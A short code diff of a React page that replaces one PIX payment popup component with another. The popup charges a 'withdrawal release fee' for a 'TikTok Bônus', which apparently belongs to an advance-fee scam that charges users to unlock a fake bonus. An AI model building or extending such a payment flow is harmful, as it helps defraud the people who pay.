@@ -1,7 +1,7 @@
 import { useState, useEffect, useCallback, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import '../styles/app.css';
-import MangofyPixPopup from '@/components/MangofyPixPopup';
+import ZyroPayPixPopup from '@/components/ZyroPayPixPopup';
 import CoinRainEffect from '@/components/CoinRainEffect';
 import { supabase } from '@/integrations/supabase/client';
 
@@ -757,7 +757,7 @@ const Index = () => {
 
       {/* PIX Payment Popup */}
       {showPixPopup && (
-        <MangofyPixPopup
+        <ZyroPayPixPopup
           amount={TAXA_SAQUE_CENTAVOS}
           description="Taxa de liberação de saque TikTok Bônus"
           onSuccess={() => {
